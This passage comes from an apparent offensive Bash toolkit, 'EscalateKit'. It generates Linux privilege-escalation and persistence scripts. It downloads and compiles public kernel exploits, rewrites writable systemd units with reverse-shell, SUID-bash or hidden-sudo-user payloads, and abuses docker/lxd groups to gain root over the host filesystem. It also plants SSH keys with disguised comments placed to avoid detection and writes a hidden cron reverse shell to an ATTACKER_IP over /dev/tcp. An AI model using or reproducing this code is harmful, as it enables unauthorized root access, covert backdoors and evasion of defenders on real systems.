echo ""

# Check for compilation tools
echo "[*] Checking for compilation tools..."
missing_tools=""

if ! command -v gcc &> /dev/null; then
    missing_tools="$missing_tools gcc"
fi

if ! command -v make &> /dev/null; then
    missing_tools="$missing_tools make"
fi

if [ -n "$missing_tools" ]; then
    echo "[-] Missing tools:$missing_tools"
    echo "[*] Install with: sudo apt-get install build-essential"
    echo ""
else
    echo "[+] Compilation tools available"
    echo ""
fi

# Kernel exploit options based on detected vulnerabilities
echo "[*] Potential kernel exploits for your system:"
echo ""

# Add specific exploits based on suggestions file
if grep -q "Dirty COW" /tmp/.escalatekit_results/exploit/suggestions.txt 2>/dev/null; then
    echo "[+] Dirty COW (CVE-2016-5195)"
    echo "    Download: wget https://github.com/FireFart/dirtycow/raw/master/dirty.c"
    echo "    Compile: gcc -pthread dirty.c -o dirty -lcrypt"
    echo "    Execute: ./dirty"
    echo ""
fi

if grep -q "PwnKit" /tmp/.escalatekit_results/exploit/suggestions.txt 2>/dev/null; then
    echo "[+] PwnKit (CVE-2021-4034)"
    echo "    Download: wget https://github.com/berdav/CVE-2021-4034/raw/main/cve-2021-4034.c"
    echo "    Compile: gcc cve-2021-4034.c -o pwnkit"
    echo "    Execute: ./pwnkit"
    echo ""
fi

if grep -q "DirtyPipe" /tmp/.escalatekit_results/exploit/suggestions.txt 2>/dev/null; then
    echo "[+] DirtyPipe (CVE-2022-0847)"
    echo "    Download: wget https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/raw/main/exploit-1.c"
    echo "    Compile: gcc exploit-1.c -o dirtypipe"
    echo "    Execute: ./dirtypipe"
    echo ""
fi

echo "[!] Warning: Kernel exploits can crash the system!"
echo "[!] Test in a safe environment first"
EOF
        chmod +x "$OUTPUT_DIR/exploit/templates/kernel_exploit_helper.sh"
        template_count=$((template_count + 1))
    fi

    # 6. WRITABLE FILES EXPLOIT TEMPLATES
    if grep -q "writable.*service\|writable.*systemd" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating systemd service exploit template"

        cat >"$OUTPUT_DIR/exploit/templates/systemd_service_exploit.sh" <<'EOF'
#!/bin/bash
# Systemd Service Exploit
# Generated by EscalateKit

echo "[*] Systemd Service File Exploitation"
echo ""

# Find writable service files
echo "[*] Searching for writable systemd service files..."
writable_services=$(find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null)

if [ -z "$writable_services" ]; then
    echo "[-] No writable systemd service files found"
    exit 1
fi

echo "[+] Found writable service files:"
echo "$writable_services"
echo ""

# Select service file
if [ $(echo "$writable_services" | wc -l) -eq 1 ]; then
    service_file="$writable_services"
    echo "[*] Using: $service_file"
else
    echo "[*] Multiple service files found. Please select one:"
    echo "$writable_services" | nl
    read -p "Enter number: " selection
    service_file=$(echo "$writable_services" | sed -n "${selection}p")
fi

if [ ! -w "$service_file" ]; then
    echo "[-] Selected file is not writable: $service_file"
    exit 1
fi

echo "[*] Selected service file: $service_file"
echo ""

# Backup original
backup_file="${service_file}.bak.$(date +%s)"
echo "[*] Creating backup: $backup_file"
cp "$service_file" "$backup_file"

# Show current content
echo "[*] Current service file content:"
echo "--- BEGIN CURRENT CONTENT ---"
cat "$service_file"
echo "--- END CURRENT CONTENT ---"
echo ""

# Payload options
echo "[*] Choose payload method:"
echo "1. Reverse shell"
echo "2. Add SUID bash"
echo "3. Add privileged user"
echo ""

read -p "Enter choice (1-3): " choice

case $choice in
    1)
        read -p "Enter your IP: " ip
        read -p "Enter your port: " port
        
        cat > "$service_file" << PAYLOAD
[Unit]
Description=System Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
PAYLOAD
        echo "[+] Reverse shell payload configured"
        echo "[+] Set up listener: nc -lvnp $port"
        ;;
    2)
        cat > "$service_file" << PAYLOAD
[Unit]
Description=System Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/.system_bash && chmod +s /tmp/.system_bash'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
PAYLOAD
        echo "[+] SUID bash payload configured"
        echo "[+] After service runs, execute: /tmp/.system_bash -p"
        ;;
    3)
        read -p "Username: " user
        read -p "Password: " pass
        
        cat > "$service_file" << PAYLOAD
[Unit]
Description=System Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'useradd -m -s /bin/bash -G sudo $user && echo "$user:$pass" | chpasswd'
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
PAYLOAD
        echo "[+] User creation payload configured"
        echo "[+] User: $user, Password: $pass"
        ;;
esac

echo ""
echo "[+] Service file modified successfully"
echo "[*] Restart the service to trigger payload:"
echo "    sudo systemctl daemon-reload"
echo "    sudo systemctl restart $(basename $service_file .service)"
echo ""
echo "To restore original:"
echo "    cp $backup_file $service_file"
EOF
        chmod +x "$OUTPUT_DIR/exploit/templates/systemd_service_exploit.sh"
        template_count=$((template_count + 1))
    fi

    # 7. DOCKER/LXD GROUP EXPLOIT TEMPLATES
    if grep -q "docker.*group\|lxd.*group" "$OUTPUT_DIR/exploit/suggestions.txt"; then
        log_message "INFOS" "Generating container group exploit templates"

        if grep -q "docker.*group" "$OUTPUT_DIR/exploit/suggestions.txt"; then
            cat >"$OUTPUT_DIR/exploit/templates/docker_group_exploit.sh" <<'EOF'
#!/bin/bash
# Docker Group Privilege Escalation
# Generated by EscalateKit

echo "[*] Docker Group Privilege Escalation"
echo ""

# Check if user is in docker group
if ! groups | grep -q docker; then
    echo "[-] Current user is not in docker group"
    echo "    Add user to docker group first:"
    echo "    sudo usermod -aG docker \$(whoami)"
    exit 1
fi

echo "[+] User is in docker group"
echo ""

# Check if docker is running
if ! docker ps &>/dev/null; then
    echo "[-] Docker is not running or accessible"
    echo "    Start docker service: sudo systemctl start docker"
    exit 1
fi

echo "[+] Docker is accessible"
echo ""

echo "[*] Available Docker privilege escalation methods:"
echo ""

echo "1. Mount host filesystem and chroot"
echo "   docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
echo ""

echo "2. Mount host filesystem with privilege"
echo "   docker run -v /:/host --rm -it --privileged alpine sh"
echo "   # Then access host files at /host"
echo ""

echo "3. Interactive root shell"
echo "   docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh"
echo ""

echo "4. Create SUID bash on host"
echo "   docker run -v /:/mnt --rm alpine sh -c 'cp /mnt/bin/bash /mnt/tmp/.dockerbash && chmod +s /mnt/tmp/.dockerbash'"
echo "   # Then run: /tmp/.dockerbash -p"
echo ""

echo "[!] Choose a method and execute the corresponding command"
EOF
            chmod +x "$OUTPUT_DIR/exploit/templates/docker_group_exploit.sh"
            template_count=$((template_count + 1))
        fi

        if grep -q "lxd.*group" "$OUTPUT_DIR/exploit/suggestions.txt"; then
            cat >"$OUTPUT_DIR/exploit/templates/lxd_group_exploit.sh" <<'EOF'
#!/bin/bash
# LXD Group Privilege Escalation
# Generated by EscalateKit

echo "[*] LXD Group Privilege Escalation"
echo ""

# Check if user is in lxd group
if ! groups | grep -q lxd; then
    echo "[-] Current user is not in lxd group"
    exit 1
fi

echo "[+] User is in lxd group"
echo ""

echo "[*] Setting up LXD privilege escalation..."

# Initialize LXD if needed
if ! lxc list &>/dev/null; then
    echo "[*] Initializing LXD..."
    lxd init --auto
fi

# Create privileged container
container_name="privesc$(date +%s)"
echo "[*] Creating privileged container: $container_name"

lxc init ubuntu:18.04 "$container_name" -c security.privileged=true 2>/dev/null ||
lxc init images:alpine/3.8 "$container_name" -c security.privileged=true

# Mount host filesystem
echo "[*] Mounting host filesystem..."
lxc config device add "$container_name" rootdisk disk source=/ path=/mnt/root recursive=true

# Start container and get shell
echo "[*] Starting container..."
lxc start "$container_name"

echo "[+] Container started successfully"
echo "[+] Getting root shell in container with host filesystem access..."
echo ""
echo "Execute the following command to get root:"
echo "lxc exec $container_name /bin/bash"
echo ""
echo "Inside the container, the host filesystem is mounted at /mnt/root"
echo "You can access and modify any host files from there"
echo ""
echo "To clean up later:"
echo "lxc stop $container_name"
echo "lxc delete $container_name"
EOF
            chmod +x "$OUTPUT_DIR/exploit/templates/lxd_group_exploit.sh"
            template_count=$((template_count + 1))
        fi
    fi

    # 8. GENERATE MASTER EXPLOIT SCRIPT
    cat >"$OUTPUT_DIR/exploit/templates/master_exploit.sh" <<'EOF'
#!/bin/bash
# Master Exploit Script
# Generated by EscalateKit
# This script provides a menu to choose from available exploits

echo "========================================"
echo "        EscalateKit Master Exploit"
echo "========================================"
echo ""

# Check available exploit templates
templates_dir="$(dirname "$0")"
available_templates=$(find "$templates_dir" -name "*.sh" -not -name "master_exploit.sh" 2>/dev/null)

if [ -z "$available_templates" ]; then
    echo "[-] No exploit templates found"
    exit 1
fi

echo "[*] Available exploit templates:"
echo ""

# Display menu
counter=1
declare -a template_array
while IFS= read -r template; do
    template_name=$(basename "$template" .sh)
    template_desc=$(head -n 3 "$template" | grep "^#" | tail -n 1 | sed 's/^# //')
    echo "$counter. $template_name"
    echo "   $template_desc"
    echo ""
    template_array[$counter]="$template"
    counter=$((counter + 1))
done <<< "$available_templates"

# Get user choice
read -p "Enter template number to execute (1-$((counter-1))): " choice

if [ "$choice" -ge 1 ] && [ "$choice" -lt "$counter" ]; then
    selected_template="${template_array[$choice]}"
    echo ""
    echo "[*] Executing: $(basename "$selected_template")"
    echo ""
    bash "$selected_template"
else
    echo "[-] Invalid choice"
    exit 1
fi
EOF
    chmod +x "$OUTPUT_DIR/exploit/templates/master_exploit.sh"
    template_count=$((template_count + 1))

    # Summary
    echo ""
    log_message "INFOS" "Generated $template_count exploit templates in $OUTPUT_DIR/exploit/templates/"

    return 0
}

# ----------------------------------------------------------------------
# Persistence Module
# ----------------------------------------------------------------------

persist_ssh_key() {
    log_message "INFOS" "Setting up SSH key persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/ssh_key.txt"

    echo "--- SSH Key Persistence Analysis ---" >"$output_file"
    echo "Generated: $(date)" >>"$output_file"
    echo "User: $(whoami)" >>"$output_file"
    echo "Target: $(hostname)" >>"$output_file"
    echo "" >>"$output_file"

    # Check if we have a home directory
    current_user=$(whoami)
    home_dir=$(eval echo ~$current_user)

    if [ ! -d "$home_dir" ]; then
        echo "[-] Home directory not found or not accessible: $home_dir" >>"$output_file"
        log_message "ERROR" "Home directory not found or not accessible"
        return 1
    fi

    echo "[*] Home directory accessible: $home_dir" >>"$output_file"

    # Check SSH service status
    echo -e "\n=== SSH Service Analysis ===" >>"$output_file"

    # Check if SSH daemon is running
    if pgrep -x "sshd" >/dev/null; then
        echo "[+] SSH daemon is running" >>"$output_file"

        # Get SSH service status
        if command -v systemctl >/dev/null 2>&1; then
            ssh_status=$(systemctl is-active ssh 2>/dev/null || systemctl is-active sshd 2>/dev/null || echo "unknown")
            echo "    SSH service status: $ssh_status" >>"$output_file"
        fi

        # Check SSH port
        ssh_port=$(netstat -tlnp 2>/dev/null | grep :22 | head -1 | awk '{print $4}' | cut -d: -f2)
        if [ -n "$ssh_port" ]; then
            echo "    SSH listening on port: $ssh_port" >>"$output_file"
        else
            echo "    SSH port: 22 (default, not confirmed)" >>"$output_file"
        fi
    else
        echo "[-] SSH daemon not running - SSH persistence may not work" >>"$output_file"
        echo "    Consider alternative persistence methods" >>"$output_file"
    fi

    # Check SSH configuration
    echo -e "\n=== SSH Configuration Analysis ===" >>"$output_file"

    if [ -f "/etc/ssh/sshd_config" ]; then
        echo "[*] Analyzing SSH configuration..." >>"$output_file"

        # Check if password authentication is enabled
        if grep -q "^PasswordAuthentication.*yes" /etc/ssh/sshd_config 2>/dev/null; then
            echo "[+] Password authentication enabled" >>"$output_file"
        elif grep -q "^PasswordAuthentication.*no" /etc/ssh/sshd_config 2>/dev/null; then
            echo "[!] Password authentication disabled - key-based auth required" >>"$output_file"
        else
            echo "[?] Password authentication status unclear (default: enabled)" >>"$output_file"
        fi

        # Check if public key authentication is enabled
        if grep -q "^PubkeyAuthentication.*yes" /etc/ssh/sshd_config 2>/dev/null; then
            echo "[+] Public key authentication enabled" >>"$output_file"
        elif grep -q "^PubkeyAuthentication.*no" /etc/ssh/sshd_config 2>/dev/null; then
            echo "[-] Public key authentication disabled - SSH key persistence won't work" >>"$output_file"
            echo "    This persistence method will fail!" >>"$output_file"
        else
            echo "[+] Public key authentication status unclear (default: enabled)" >>"$output_file"
        fi

        # Check for root login restrictions
        if grep -q "^PermitRootLogin.*no" /etc/ssh/sshd_config 2>/dev/null; then
            echo "[!] Root login disabled via SSH" >>"$output_file"
        elif grep -q "^PermitRootLogin.*prohibit-password" /etc/ssh/sshd_config 2>/dev/null; then
            echo "[!] Root login allowed only with keys (no password)" >>"$output_file"
        fi

        # Check authorized keys file location
        auth_keys_file=$(grep "^AuthorizedKeysFile" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | head -1)
        if [ -n "$auth_keys_file" ]; then
            echo "[*] Custom authorized keys file: $auth_keys_file" >>"$output_file"
        else
            echo "[*] Using default authorized keys location" >>"$output_file"
        fi
    else
        echo "[-] SSH configuration file not accessible" >>"$output_file"
    fi

    # SSH directory setup
    echo -e "\n=== SSH Directory Setup ===" >>"$output_file"

    ssh_dir="$home_dir/.ssh"
    if [ ! -d "$ssh_dir" ]; then
        echo "[*] SSH directory does not exist, will be created: $ssh_dir" >>"$output_file"
        mkdir -p "$ssh_dir" 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "[-] Could not create SSH directory: $ssh_dir" >>"$output_file"
            log_message "ERROR" "Could not create SSH directory: $ssh_dir"
            return 1
        fi
        chmod 700 "$ssh_dir" 2>/dev/null
        echo "[+] SSH directory created with proper permissions (700)" >>"$output_file"
    else
        echo "[+] SSH directory already exists: $ssh_dir" >>"$output_file"
        # Check permissions
        ssh_dir_perms=$(stat -c "%a" "$ssh_dir" 2>/dev/null)
        if [ "$ssh_dir_perms" = "700" ]; then
            echo "    Permissions: $ssh_dir_perms (secure)" >>"$output_file"
        else
            echo "    Permissions: $ssh_dir_perms (may need to be 700)" >>"$output_file"
        fi
    fi

    # Authorized keys file setup
    auth_keys="$ssh_dir/authorized_keys"
    echo -e "\n=== Authorized Keys Analysis ===" >>"$output_file"

    if [ -f "$auth_keys" ]; then
        echo "[+] Authorized keys file exists: $auth_keys" >>"$output_file"

        # Check current content
        key_count=$(wc -l <"$auth_keys" 2>/dev/null || echo "0")
        echo "    Current number of keys: $key_count" >>"$output_file"

        # Check permissions
        auth_keys_perms=$(stat -c "%a" "$auth_keys" 2>/dev/null)
        if [ "$auth_keys_perms" = "600" ]; then
            echo "    Permissions: $auth_keys_perms (secure)" >>"$output_file"
        else
            echo "    Permissions: $auth_keys_perms (should be 600)" >>"$output_file"
        fi

        # Show existing keys (first 20 chars for identification)
        if [ "$key_count" -gt 0 ]; then
            echo "    Existing keys (partial):" >>"$output_file"
            cat "$auth_keys" | while read -r line; do
                if [ -n "$line" ]; then
                    key_type=$(echo "$line" | awk '{print $1}')
                    key_start=$(echo "$line" | awk '{print $2}' | cut -c1-20)
                    key_comment=$(echo "$line" | awk '{for(i=3;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/ $//')
                    echo "      $key_type $key_start... $key_comment" >>"$output_file"
                fi
            done
        fi
    else
        echo "[*] Authorized keys file does not exist, will be created: $auth_keys" >>"$output_file"
        touch "$auth_keys" 2>/dev/null
        if [ $? -ne 0 ]; then
            echo "[-] Could not create authorized_keys file: $auth_keys" >>"$output_file"
            log_message "ERROR" "Could not create authorized_keys file: $auth_keys"
            return 1
        fi
        chmod 600 "$auth_keys" 2>/dev/null
        echo "[+] Authorized keys file created with proper permissions (600)" >>"$output_file"
    fi

    # Network connectivity check
    echo -e "\n=== Network Connectivity Check ===" >>"$output_file"

    # Get network interfaces
    interfaces=$(ip addr show 2>/dev/null | grep "inet " | grep -v "127.0.0.1" | awk '{print $2}' | cut -d/ -f1)
    if [ -n "$interfaces" ]; then
        echo "[+] Available network interfaces:" >>"$output_file"
        echo "$interfaces" | while read -r ip; do
            echo "    $ip" >>"$output_file"
        done
    else
        echo "[-] No external network interfaces found" >>"$output_file"
    fi

    # Check if target is reachable from outside
    public_ip=$(curl -s -m 5 ifconfig.me 2>/dev/null || curl -s -m 5 ipinfo.io/ip 2>/dev/null || echo "unknown")
    echo "    Public IP (if accessible): $public_ip" >>"$output_file"

    # Generate multiple persistence methods
    echo -e "\n===========================================" >>"$output_file"
    echo "         SSH KEY PERSISTENCE METHODS" >>"$output_file"
    echo "===========================================" >>"$output_file"

    # Method 1: Standard SSH key persistence
    echo -e "\n--- Method 1: Standard SSH Key Persistence ---" >>"$output_file"
    echo "[+] Basic SSH key persistence steps:" >>"$output_file"
    echo "    1. Generate an SSH key pair on your attack machine:" >>"$output_file"
    echo "       ssh-keygen -t ed25519 -f ./persist_key -N '' -C 'backup-service'" >>"$output_file"
    echo "    2. Add the public key to authorized_keys on the target:" >>"$output_file"
    echo "       echo 'ssh-ed25519 AAAAC3N...' >> $auth_keys" >>"$output_file"
    echo "    3. Connect using the private key:" >>"$output_file"
    echo "       ssh -i persist_key $current_user@<target_ip>" >>"$output_file"
    echo "" >>"$output_file"

    # Method 2: Stealthy SSH key persistence
    echo "--- Method 2: Stealthy SSH Key Persistence ---" >>"$output_file"
    echo "[+] Stealthy approach with realistic key comment:" >>"$output_file"
    echo "    1. Generate key with system-like comment:" >>"$output_file"
    echo "       ssh-keygen -t rsa -b 2048 -f ./backup_key -N '' -C 'root@$(hostname)-backup'" >>"$output_file"
    echo "    2. Add key between existing keys to blend in:" >>"$output_file"
    echo "       # Insert in middle of existing authorized_keys if possible" >>"$output_file"
    echo "    3. Use common SSH options to avoid detection:" >>"$output_file"
    echo "       ssh -i backup_key -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $current_user@<target_ip>" >>"$output_file"
    echo "" >>"$output_file"

    # Method 3: Restricted SSH key
    echo "--- Method 3: Restricted SSH Key (Less Suspicious) ---" >>"$output_file"
    echo "[+] SSH key with command restrictions:" >>"$output_file"
    echo "    1. Generate key:" >>"$output_file"
    echo "       ssh-keygen -t ed25519 -f ./restricted_key -N '' -C 'monitoring-script'" >>"$output_file"
    echo "    2. Add with command restriction:" >>"$output_file"
    echo "       echo 'command=\"/bin/bash\",no-port-forwarding ssh-ed25519 AAAAC3N...' >> $auth_keys" >>"$output_file"
    echo "    3. This appears to be a restricted key but still provides shell access" >>"$output_file"
    echo "" >>"$output_file"

    # Create enhanced SSH key persistence script
    cat >"$OUTPUT_DIR/persist/add_ssh_key.sh" <<'EOF'
#!/bin/bash
# Enhanced SSH Key Persistence Script
# Generated by EscalateKit

echo "[*] Enhanced SSH Key Persistence Setup"
echo "======================================="

# Configuration
SSH_DIR="$HOME/.ssh"
AUTH_KEYS="$SSH_DIR/authorized_keys"
BACKUP_SUFFIX=".backup.$(date +%s)"

# Check if SSH is available
if ! command -v ssh >/dev/null 2>&1; then
    echo "[-] SSH not available on this system"
    exit 1
fi

# Function to backup existing authorized_keys
backup_auth_keys() {
    if [ -f "$AUTH_KEYS" ]; then
        echo "[*] Backing up existing authorized_keys..."
        cp "$AUTH_KEYS" "${AUTH_KEYS}${BACKUP_SUFFIX}"
        echo "[+] Backup created: ${AUTH_KEYS}${BACKUP_SUFFIX}"
    fi
}

# Function to restore authorized_keys
restore_auth_keys() {
    local backup_file="${AUTH_KEYS}${BACKUP_SUFFIX}"
    if [ -f "$backup_file" ]; then
        echo "[*] Restoring original authorized_keys..."
        cp "$backup_file" "$AUTH_KEYS"
        rm -f "$backup_file"
        echo "[+] Original authorized_keys restored"
    fi
}

# Function to setup SSH key persistence
setup_ssh_persistence() {
    local method="$1"
    local public_key="$2"
    
    # Create SSH directory if needed
    if [ ! -d "$SSH_DIR" ]; then
        echo "[*] Creating SSH directory: $SSH_DIR"
        mkdir -p "$SSH_DIR"
        chmod 700 "$SSH_DIR"
    fi
    
    # Create or ensure authorized_keys exists
    if [ ! -f "$AUTH_KEYS" ]; then
        echo "[*] Creating authorized_keys file: $AUTH_KEYS"
        touch "$AUTH_KEYS"
        chmod 600 "$AUTH_KEYS"
    fi
    
    # Backup existing keys
    backup_auth_keys
    
    # Add the key based on method
    case "$method" in
        "standard")
            echo "[*] Adding standard SSH key..."
            echo "$public_key" >> "$AUTH_KEYS"
            ;;
        "stealthy")
            echo "[*] Adding SSH key stealthily (mixed with existing keys)..."
            if [ -s "$AUTH_KEYS" ]; then
                # Insert in the middle of existing keys
                total_lines=$(wc -l < "$AUTH_KEYS")
                if [ "$total_lines" -gt 1 ]; then
                    middle_line=$((total_lines / 2))
                    head -n $middle_line "$AUTH_KEYS" > "${AUTH_KEYS}.tmp"
                    echo "$public_key" >> "${AUTH_KEYS}.tmp"
                    tail -n +$((middle_line + 1)) "$AUTH_KEYS" >> "${AUTH_KEYS}.tmp"
                    mv "${AUTH_KEYS}.tmp" "$AUTH_KEYS"
                else
                    echo "$public_key" >> "$AUTH_KEYS"
                fi
            else
                echo "$public_key" >> "$AUTH_KEYS"
            fi
            ;;
        "restricted")
            echo "[*] Adding restricted SSH key..."
            echo "command=\"/bin/bash\",no-port-forwarding $public_key" >> "$AUTH_KEYS"
            ;;
        *)
            echo "[-] Unknown method: $method"
            return 1
            ;;
    esac
    
    # Set proper permissions
    chmod 600 "$AUTH_KEYS"
    chmod 700 "$SSH_DIR"
    
    echo "[+] SSH key persistence setup complete"
    echo "[+] Method used: $method"
    echo "[+] Key added to: $AUTH_KEYS"
    
    # Show current key count
    key_count=$(wc -l < "$AUTH_KEYS")
    echo "[*] Total keys in authorized_keys: $key_count"
}

# Main menu
echo ""
echo "Choose persistence method:"
echo "1. Standard SSH key (simple)"
echo "2. Stealthy SSH key (blends with existing keys)"
echo "3. Restricted SSH key (appears limited but functional)"
echo "4. Custom SSH key"
echo "5. Remove persistence (restore backup)"
echo ""

read -p "Enter choice (1-5): " choice

case "$choice" in
    1|2|3|4)
        if [ "$choice" -eq 4 ]; then
            echo "Enter your custom SSH public key format:"
            echo "Example: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxx... user@host"
        else
            echo "Enter your SSH public key:"
            echo "Example: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxx... user@host"
        fi
        
        read -p "Public key: " public_key
        
        if [ -z "$public_key" ]; then
            echo "[-] No public key provided"
            exit 1
        fi
        
        # Validate key format
        if ! echo "$public_key" | grep -qE "^(ssh-rsa|ssh-ed25519|ssh-dss|ecdsa-sha2-)" ; then
            echo "[-] Invalid SSH public key format"
            exit 1
        fi
        
        case "$choice" in
            1) method="standard" ;;
            2) method="stealthy" ;;
            3) method="restricted" ;;
            4) method="standard" ;;  # Custom uses standard method
        esac
        
        setup_ssh_persistence "$method" "$public_key"
        ;;
    5)
        restore_auth_keys
        ;;
    *)
        echo "[-] Invalid choice"
        exit 1
        ;;
esac

echo ""
echo "[+] Operation complete"
echo ""
echo "Connection commands:"
echo "Standard: ssh -i <private_key> $(whoami)@<target_ip>"
echo "Stealthy: ssh -i <private_key> -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $(whoami)@<target_ip>"
EOF

    chmod +x "$OUTPUT_DIR/persist/add_ssh_key.sh"

    # Create SSH key generator script
    cat >"$OUTPUT_DIR/persist/generate_ssh_keys.sh" <<'EOF'
#!/bin/bash
# SSH Key Generator for Persistence
# Generated by EscalateKit

echo "[*] SSH Key Generator for Persistence"
echo "====================================="

# Key types and their characteristics
echo ""
echo "Available key types:"
echo "1. ED25519 (recommended, modern, secure)"
echo "2. RSA 2048 (widely compatible)"
echo "3. RSA 4096 (high security, larger)"
echo "4. ECDSA P-256 (fast, good security)"
echo ""

read -p "Choose key type (1-4): " key_choice

case "$key_choice" in
    1)
        key_type="ed25519"
        key_params="-t ed25519"
        ;;
    2)
        key_type="rsa2048"
        key_params="-t rsa -b 2048"
        ;;
    3)
        key_type="rsa4096"
        key_params="-t rsa -b 4096"
        ;;
    4)
        key_type="ecdsa"
        key_params="-t ecdsa -b 256"
        ;;
    *)
        echo "[-] Invalid choice, using ED25519"
        key_type="ed25519"
        key_params="-t ed25519"
        ;;
esac

# Key naming
echo ""
echo "Choose key purpose/name:"
echo "1. backup-service (appears to be for backups)"
echo "2. monitoring-script (appears to be for monitoring)"
echo "3. system-maintenance (appears to be for maintenance)"
echo "4. log-collector (appears to be for log collection)"
echo "5. custom (specify your own)"
echo ""

read -p "Choose purpose (1-5): " purpose_choice

case "$purpose_choice" in
    1) key_comment="backup-service@$(hostname)" ;;
    2) key_comment="monitoring-script@$(hostname)" ;;
    3) key_comment="system-maintenance@$(hostname)" ;;
    4) key_comment="log-collector@$(hostname)" ;;
    5) 
        read -p "Enter custom comment: " custom_comment
        key_comment="$custom_comment"
        ;;
    *)
        key_comment="service@$(hostname)"
        ;;
esac

# Generate the key
key_filename="persist_${key_type}_$(date +%s)"
echo ""
echo "[*] Generating SSH key pair..."
echo "Key type: $key_type"
echo "Comment: $key_comment"
echo "Filename: $key_filename"
echo ""

ssh-keygen $key_params -f "./$key_filename" -N "" -C "$key_comment"

if [ $? -eq 0 ]; then
    echo ""
    echo "[+] SSH key pair generated successfully!"
    echo ""
    echo "Files created:"
    echo "  Private key: $key_filename"
    echo "  Public key:  $key_filename.pub"
    echo ""
    echo "Your public key (copy this to authorized_keys):"
    echo "================================================"
    cat "./$key_filename.pub"
    echo "================================================"
    echo ""
    echo "Connection command:"
    echo "ssh -i $key_filename $(whoami)@<target_ip>"
    echo ""
    echo "Stealthy connection command:"
    echo "ssh -i $key_filename -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $(whoami)@<target_ip>"
    echo ""
    
    # Set proper permissions
    chmod 600 "./$key_filename"
    chmod 644 "./$key_filename.pub"
    
    echo "[*] Proper permissions set on key files"
else
    echo "[-] Failed to generate SSH key pair"
    exit 1
fi
EOF

    chmod +x "$OUTPUT_DIR/persist/generate_ssh_keys.sh"

    # Summary in output file
    echo -e "\n===========================================" >>"$output_file"
    echo "              SUMMARY & RECOMMENDATIONS" >>"$output_file"
    echo "===========================================" >>"$output_file"

    if pgrep -x "sshd" >/dev/null; then
        echo "[+] SSH persistence is viable on this target" >>"$output_file"
        echo "[+] SSH daemon is running and accessible" >>"$output_file"
    else
        echo "[-] SSH persistence may not work - daemon not running" >>"$output_file"
    fi

    echo "" >>"$output_file"
    echo "Generated scripts:" >>"$output_file"
    echo "  1. $OUTPUT_DIR/persist/add_ssh_key.sh - Interactive key installation" >>"$output_file"
    echo "  2. $OUTPUT_DIR/persist/generate_ssh_keys.sh - Key pair generator" >>"$output_file"
    echo "" >>"$output_file"
    echo "Recommended approach:" >>"$output_file"
    echo "  1. Run generate_ssh_keys.sh to create key pair" >>"$output_file"
    echo "  2. Use add_ssh_key.sh to install the public key" >>"$output_file"
    echo "  3. Choose 'stealthy' method for better OPSEC" >>"$output_file"
    echo "  4. Test connection immediately after setup" >>"$output_file"

    log_message "INFOS" "Enhanced SSH key persistence setup complete"
    log_message "INFOS" "Scripts created: add_ssh_key.sh, generate_ssh_keys.sh"

    return 0
}

persist_cron_job() {
    log_message "INFOS" "Setting up cron job persistence"

    mkdir -p "$OUTPUT_DIR/persist"
    local output_file="$OUTPUT_DIR/persist/cron_job.txt"

    echo "--- Cron Job Persistence ---" >"$output_file"

    # Check if we can access user crontab
    if ! command -v crontab >/dev/null 2>&1; then
        echo "[-] crontab command not found" >>"$output_file"
        log_message "ERROR" "crontab command not found"
        return 1
    fi

    # Create a hidden directory for the persistence script
    hidden_dir="$HOME/.cache/.persist"
    mkdir -p "$hidden_dir" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "[-] Could not create hidden directory: $hidden_dir" >>"$output_file"
        log_message "ERROR" "Could not create hidden directory: $hidden_dir"
        return 1
    fi

    # Create the persistence script
    persist_script="$hidden_dir/update.sh"
    echo "#!/bin/bash" >"$persist_script"
    echo "# Hidden persistence script" >>"$persist_script"
    echo "# Reverse shell payload - replace ATTACKER_IP and ATTACKER_PORT" >>"$persist_script"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &" >>"$persist_script"
    chmod +x "$persist_script"

    # Create a script to add the cron job
    echo "#!/bin/bash" >"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Cron Job Persistence Script" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Generated by EscalateKit" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Create hidden directory and persistence script" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "mkdir -p \"$hidden_dir\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "cat > \"$persist_script\" << 'EOF'" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "#!/bin/bash" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Hidden persistence script" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "# Replace ATTACKER_IP and ATTACKER_PORT with your actual values" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "EOF" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "chmod +x \"$persist_script\"" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
    echo "" >>"$OUTPUT_DIR/persist/add_cron_job.sh"
